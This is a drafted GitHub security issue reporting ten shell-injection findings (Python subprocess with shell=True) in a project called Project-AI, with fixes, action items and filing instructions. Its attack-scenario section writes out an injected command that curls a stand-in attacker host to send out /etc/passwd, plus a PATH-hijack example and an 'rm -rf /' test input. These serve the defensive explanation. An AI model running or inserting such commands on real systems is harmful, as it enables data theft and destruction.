# GitHub Issue: Shell Injection Vulnerabilities (B602)

**Title:** `[CRITICAL] Shell Injection Vulnerabilities (B602) - 10 instances`

**Labels:** `security`, `critical`, `vulnerability`

**Repository:** IAmSoThirsty/Project-AI

---

## 🔴 CRITICAL SECURITY VULNERABILITY: Shell Injection (B602)

### Summary

**10 instances** of shell injection vulnerabilities have been identified across the codebase where `subprocess.run()` is called with `shell=True`. This creates a critical security risk allowing **command injection** and **arbitrary code execution**.

### Severity Assessment

- **Severity:** 🔴 HIGH
- **Impact:** Command injection, arbitrary code execution
- **Attack Vector:** Malicious input in command strings
- **Exploitability:** High (if user input reaches these calls)
- **CVSS Score:** ~8.8 (High)

### Affected Files and Locations

#### 1. src/app/core/cerberus_runtime_manager.py:128
```python
result = subprocess.run(
    runtime.health_check_cmd,
    shell=True,  # ⚠️ VULNERABLE
    capture_output=True,
    timeout=timeout,
    text=True,
)
```
**Risk:** If `health_check_cmd` contains user-controlled data, attackers can inject arbitrary commands.

#### 2. src/app/infrastructure/networking/wifi_controller.py (3 instances)
- **Line 227**
- **Line 264**
- **Line 504**

```python
subprocess.run(
    ["netsh", "wlan", "show", "interfaces"],
    shell=True,  # ⚠️ VULNERABLE - unnecessary with list args
)
```
**Risk:** Using `shell=True` with list arguments is unnecessary and creates attack surface.

#### 3. src/app/infrastructure/vpn/backends.py (6 instances)
- **Line 67**
- **Line 134**
- **Line 187**
- **Line 245**
- **Line 369**
- **Line 420**

```python
subprocess.run(
    ["where", "wireguard"],
    shell=True,  # ⚠️ VULNERABLE - unnecessary on Windows
)
```
**Risk:** Shell invocation is unnecessary for simple commands and exposes to injection attacks.

### Attack Scenarios

#### Example 1: Command Injection via health_check_cmd
```python
# Attacker provides malicious health_check_cmd:
health_check_cmd = "echo test && curl attacker.com/exfil?data=$(cat /etc/passwd)"

# Vulnerable code executes both commands:
subprocess.run(health_check_cmd, shell=True)  # Executes curl and exfiltrates data
```

#### Example 2: PATH Manipulation
```python
# Attacker manipulates PATH to execute malicious binaries:
os.environ['PATH'] = '/tmp/malicious:' + os.environ['PATH']
subprocess.run(["netsh", "wlan", "show"], shell=True)  # May execute /tmp/malicious/netsh
```

### Remediation Steps

#### ✅ Fix 1: Remove shell=True (Preferred)
```python
# BEFORE (vulnerable):
subprocess.run(cmd, shell=True)

# AFTER (secure):
subprocess.run(cmd, shell=False)  # Default behavior, safe with list args
# OR simply omit the parameter:
subprocess.run(cmd)
```

#### ✅ Fix 2: Input Validation (Defense in Depth)
```python
import re
import shlex

# For string commands, validate inputs:
if not re.match(r'^[a-zA-Z0-9_\-\.]+$', user_input):
    raise ValueError("Invalid input characters")

# Or use shlex.quote() for shell escaping (only if shell=True is absolutely necessary):
safe_cmd = f"command {shlex.quote(user_input)}"
subprocess.run(safe_cmd, shell=True)
```

#### ✅ Fix 3: Use Allowlists
```python
ALLOWED_COMMANDS = {"wireguard", "netsh", "ipconfig"}

def validate_command(cmd_list):
    if cmd_list[0] not in ALLOWED_COMMANDS:
        raise ValueError(f"Command not allowed: {cmd_list[0]}")
    return cmd_list

subprocess.run(validate_command(["wireguard", "--version"]))
```

### Example Secure Implementation

```python
# BEFORE (cerberus_runtime_manager.py:128):
result = subprocess.run(
    runtime.health_check_cmd,
    shell=True,  # VULNERABLE
    capture_output=True,
    timeout=timeout,
    text=True,
)

# AFTER (secure):
# Option 1: If health_check_cmd is a list
result = subprocess.run(
    runtime.health_check_cmd,
    shell=False,  # SECURE
    capture_output=True,
    timeout=timeout,
    text=True,
)

# Option 2: If health_check_cmd is a string, convert to list
import shlex
result = subprocess.run(
    shlex.split(runtime.health_check_cmd),  # Safely parse string to list
    shell=False,  # SECURE
    capture_output=True,
    timeout=timeout,
    text=True,
)

# Option 3: Validate command before execution
ALLOWED_HEALTH_CHECKS = {
    "docker ps",
    "systemctl status",
    "ping -c 1 localhost",
}

if runtime.health_check_cmd not in ALLOWED_HEALTH_CHECKS:
    raise ValueError("Unauthorized health check command")
    
result = subprocess.run(
    shlex.split(runtime.health_check_cmd),
    shell=False,
    capture_output=True,
    timeout=timeout,
    text=True,
)
```

### Action Items

- [ ] **Fix cerberus_runtime_manager.py:128** - Validate health_check_cmd or convert to list
- [ ] **Fix wifi_controller.py:227, 264, 504** - Remove shell=True (already using list args)
- [ ] **Fix vpn/backends.py:67, 134, 187, 245, 369, 420** - Remove shell=True (already using list args)
- [ ] **Add input validation** to all subprocess calls that accept external input
- [ ] **Code review** all subprocess usage to ensure shell=False is default
- [ ] **Add pre-commit hook** to detect shell=True in new code
- [ ] **Update security documentation** with subprocess best practices

### References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Bandit B602: subprocess_popen_with_shell_equals_true](https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html)
- [Python subprocess documentation](https://docs.python.org/3/library/subprocess.html#security-considerations)

### Testing Recommendations

```python
# Add unit tests to verify shell=False:
def test_subprocess_no_shell_injection():
    # Test that malicious input doesn't execute
    malicious_input = "test; rm -rf /"
    with pytest.raises(FileNotFoundError):
        subprocess.run([malicious_input])  # Should fail to find binary, not execute rm
```

---

**Priority:** 🔴 CRITICAL - Fix within 7 days  
**Effort:** Low (simple parameter removal for most cases)  
**Risk if Unfixed:** Remote code execution, data exfiltration, system compromise

---

## Manual Issue Creation Instructions

Since GitHub MCP Server doesn't support issue creation, please create this issue manually:

1. Go to: https://github.com/IAmSoThirsty/Project-AI/issues/new
2. Copy the title: `[CRITICAL] Shell Injection Vulnerabilities (B602) - 10 instances`
3. Copy the body content from the sections above
4. Add labels: `security`, `critical`, `vulnerability`
5. Submit the issue

Alternatively, use GitHub CLI:
```bash
gh issue create \
  --repo IAmSoThirsty/Project-AI \
  --title "[CRITICAL] Shell Injection Vulnerabilities (B602) - 10 instances" \
  --label security,critical,vulnerability \
  --body-file ISSUE_SHELL_INJECTION_B602.md
```
